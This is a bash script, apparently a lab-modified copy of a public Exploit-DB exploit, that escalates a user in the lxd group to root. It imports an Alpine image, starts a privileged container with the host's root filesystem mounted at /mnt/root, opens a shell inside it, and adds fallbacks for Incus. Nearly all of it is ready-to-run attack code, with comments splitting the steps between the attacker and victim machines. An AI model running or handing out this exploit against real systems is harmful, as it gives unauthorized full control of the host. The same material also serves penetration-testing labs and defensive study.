#!/usr/bin/env bash

# ----------------------------------
# Authors: Marcelo Vazquez (S4vitar)
#          Victor Lasa      (vowkin)
# Modified by:      sil3nth4ck3r (for laboratory purposes)
# Date:             2025-09-11
# Changes:          - Incus/LXD compatibility
#                   - Auto-create storage/profile if device add fails
# Source:           https://www.exploit-db.com/exploits/46978
# ----------------------------------

# Step 1: Download build-alpine => wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine [Attacker Machine]
# Step 2: Build alpine => bash build-alpine (as root user) [Attacker Machine]
# Step 3: Run this script and you will get root [Victim Machine]
# Step 4: Once inside the container, navigate to /mnt/root to see all resources from the host machine

function helpPanel(){
  echo -e "\nUsage:"
  echo -e "\t[-f] Filename (.tar.gz alpine file)"
  echo -e "\t[-h] Show this help panel\n"
  exit 1
}

function createContainer(){
  lxc image import $filename --alias alpine
  echo -e "[*] Listing images...\n" && lxc image list
  lxc init alpine privesc -c security.privileged=true

  lxc config device add privesc giveMeRoot disk source=/ path=/mnt/root recursive=true || {
    incus storage create default dir || true
    incus profile show default >/dev/null 2>&1 || true
    incus profile device add default root disk path=/ pool=default || true
    lxc config device add privesc giveMeRoot disk source=/ path=/mnt/root recursive=true
  }

  lxc start privesc
  lxc exec privesc sh
  cleanup
}

function cleanup(){
  echo -en "\n[*] Removing container..."
  lxc stop privesc && lxc delete privesc && lxc image delete alpine
  echo " [√]"
}

set -o nounset
set -o errexit

declare -i parameter_enable=0; while getopts ":f:h:" arg; do
  case $arg in
    f) filename=$OPTARG && let parameter_enable+=1;;
    h) helpPanel;;
  esac
done

if [ $parameter_enable -ne 1 ]; then
  helpPanel
else
  createContainer
fi